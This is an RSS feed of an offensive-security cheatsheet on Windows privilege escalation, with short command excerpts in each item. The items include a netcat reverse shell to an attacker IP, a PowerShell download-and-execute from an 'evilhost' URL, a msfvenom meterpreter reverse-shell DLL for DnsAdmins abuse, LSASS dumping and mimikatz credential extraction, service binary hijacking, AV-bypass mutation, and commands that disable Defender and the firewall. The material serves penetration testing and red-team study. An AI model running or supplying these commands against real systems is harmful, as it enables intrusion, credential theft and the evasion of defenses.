<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Privilege Escalation on Offensive Security Cheatsheet</title>
    <link>/windows-systems/privilege-escalation/</link>
    <description>Recent content in Privilege Escalation on Offensive Security Cheatsheet</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    
	<atom:link href="/windows-systems/privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Automated Recon</title>
      <link>/windows-systems/privilege-escalation/automated_recon/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/automated_recon/</guid>
      <description>Binaries Information https://lolbas-project.github.io/# python3 gtfo -e Certutil.exe 
Local Exploit Suggester # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/xxx/Documents/Galactic/systeminfo.txt # Metasploit also has a module &amp;gt; use post/multi/recon/local_exploit_suggester msf5 post(multi/recon/local_exploit_suggester) &amp;gt; options Module options (post/multi/recon/local_exploit_suggester): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on SHOWDESCRIPTION false yes Displays a detailed description for the available exploits msf5 post(multi/recon/local_exploit_suggester) &amp;gt; set SESSION 1 SESSION =&amp;gt; 1 msf5 post(multi/recon/local_exploit_suggester) &amp;gt; run [*] 10.</description>
    </item>
    
    <item>
      <title>Tricks</title>
      <link>/windows-systems/privilege-escalation/tricks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/tricks/</guid>
      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html # Getting shell in limited interpreter system(&amp;#34;start cmd.exe /k $cmd&amp;#34;) # Alternative execution (eq &amp;#39;cmd.exe /c&amp;#39;) https://twitter.com/CyberRaiju/status/1273597319322058752?s=20 explorer.exe /root # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\system32\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.exe &amp;#34;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;http://evilhost/Malicious.ps1&amp;#39;)&amp;#34; # Payload as a trusted binary # Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\ # Then %userprofile%\AppData\Local\Microsoft\Teams\Update.</description>
    </item>
    
    <item>
      <title>Services &amp; Scheduled Tasks</title>
      <link>/windows-systems/privilege-escalation/services_scheduled_tasks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/services_scheduled_tasks/</guid>
      <description>Services # Query one service sc qc Spooler # Check permissions accesschk.exe -ucqv Spooler C:\&amp;gt; accesschk.exe -uwcqv &amp;#34;Authenticated Users&amp;#34; * RW SSDPSRV SERVICE_ALL_ACCESS RW upnphost SERVICE_ALL_ACCESS accesschk.exe -ucqv SSDPSRV accesschk.exe -ucqv upnphost # Search for specific service (looking for write permissions) sc qc upnphost # Following rights can give a SYSTEM shell SERVICE_CHANGE_CONFIG (Can reconfigure the service binary) WRITE_DAC (Can reconfigure permissions, leading to 1) WRITE_OWNER (Can become owner and reconfigure permissions) GENERIC_WRITE (Inherits SERVICE_CHANGE_CONFIG) GENERIC_ALL (Inherits SERVICE_CHANGE_CONFIG) # Exploit a vulnerable service (or adding new user) sc config upnphost binpath= &amp;#34;C:\nc.</description>
    </item>
    
    <item>
      <title>LSASS and Mimikatz</title>
      <link>/windows-systems/privilege-escalation/lsass_mimikatz/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/lsass_mimikatz/</guid>
      <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp 
Mimikatz # If you have an LSASS dump, you can use the minidump module mimikatz # sekurlsa::minidump lsass.DMP mimikatz # sekurlsa::logonPasswords /full # You can upload mimikatz to a remote machine with smbclient # Or you can use crackmapexec # Executon may fail but the binary will be uploaded in C:\\Windows\\mimikatz.</description>
    </item>
    
    <item>
      <title>Admin and Processes</title>
      <link>/windows-systems/privilege-escalation/admin_processes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/admin_processes/</guid>
      <description>Local Processes # Check local processes net group “Domain Admins” /domain # The account running the process should be in 7th column: tasklist /v # Then compare the 2 results 
Sessions # Query DC to check about domain active sessions: net group “Domain Controllers” /domain (build dcs.txt with it) nslookup –type=SRV _ldap._tcp. net group “Domain Admins” /domain (build admins.txt with it) netsess.exe netsess.exe servername netsess.exe servername /full (admin required) FOR /F %i in (dcs.</description>
    </item>
    
    <item>
      <title>DNSadmins group</title>
      <link>/windows-systems/privilege-escalation/dnsadmins_group/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/dnsadmins_group/</guid>
      <description># If you control any account member of the &amp;#34;DnsAdmin&amp;#34; group # You can use it to privesc on the machine # It works by adding a malicious DLL loaded by the DNS service. # You have to restart the service and the DLL will be loaded as SYSTEM# Generating the DLL $ sudo msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=5566 -f dll &amp;gt; privesc.dll # Host the DLL on a SMD server or upload it on the target machine $ sudo smbserver.</description>
    </item>
    
    <item>
      <title>Active Directory Delegations</title>
      <link>/windows-systems/privilege-escalation/delegations/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/delegations/</guid>
      <description>Unconstrained Delegation # Nice resource for user account =/= machine account in UC http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html # AD Objects having Unconstrained Delegation issues have the TRUSTED_FOR_DELEGATION flag set # You can search for users using Pywerview $ python pywerview.py get-netuser -u ownedUser -p userPassword -d foo.lan -t dc1.foo.lan --unconstrained # You can also request through ldapdomain dump and then grep for interesting $ ldapdomaindump -u &amp;#34;foo.lan\\ownedUser&amp;#34; -p &amp;#34;userPassword&amp;#34; 192.168.30.10 $ grep TRUSTED_FOR_DELEGATION *.</description>
    </item>
    
    <item>
      <title>PrivExchange</title>
      <link>/windows-systems/privilege-escalation/privexchange/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/privexchange/</guid>
      <description>Resources https://github.com/dirkjanm/PrivExchange https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/ https://chryzsh.github.io/exploiting-privexchange/ # After exploitation, you won&amp;#39;t be like Domain Admin directly, so, you won&amp;#39;t be able to connect to the # DC using Domain Admins rights. # Exploitation allows user to get DCSync privileges, which is enough to get the NTDS Database # You can then use Pass the Hash attack with administrators accounts to get real access 
Aclpwn # ACLpwn is a tool used to find compromission paths inside BloodHound data and to exploit them # BloodHound need to be running # Many options are available # Dry option is used to look for compromission without exploiting it python aclpwn.</description>
    </item>
    
    <item>
      <title>Windows Defender</title>
      <link>/windows-systems/privilege-escalation/windows_defender/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/windows_defender/</guid>
      <description># Requires admin privileges or being able to run a custom powershell sudo ! (sudo.ps1) powershell -ExecutionPolicy ByPass -command &amp;#34;&amp;amp; { . C:\Users\Username\AppData\Local\Temp\sudo_PS1-0.ps1; }&amp;#34; # Stop Windows Defender using cmd.exe sc stop WinDefend # Identify firewall profiles for an user netsh advfirewall show allprofiles # Disable all firewall profiles for an user netsh advfirewall set allprofiles state off # Totally disable the firewall netsh firewall set opmode disable</description>
    </item>
    
    <item>
      <title>Azure AD</title>
      <link>/windows-systems/privilege-escalation/azure_ad/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/azure_ad/</guid>
      <description>Exploiting Password Hash Synchronisation (PHS) https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html # The main target is the sync account # You can identify it using the description $ ldapsearch -H ldap://DC01.DOMAIN.LAN:389 -D &amp;#34;DOMAIN\user&amp;#34; -w &amp;#34;****&amp;#34; -b &amp;#34;DC=DOMAIN,DC=LAN&amp;#34; &amp;#39;(description=*Azure*)&amp;#39; description # To exploit this, need local admin or ADSync service account # Can decrypt using C:\Program Files\Microsoft Azure AD Sync\Binn\mcrypt.dll # The default configuration of Azure AD Connect uses a SQL Server Express database # but a fully deployed SQL Server can also be used.</description>
    </item>
    
  </channel>
</rss>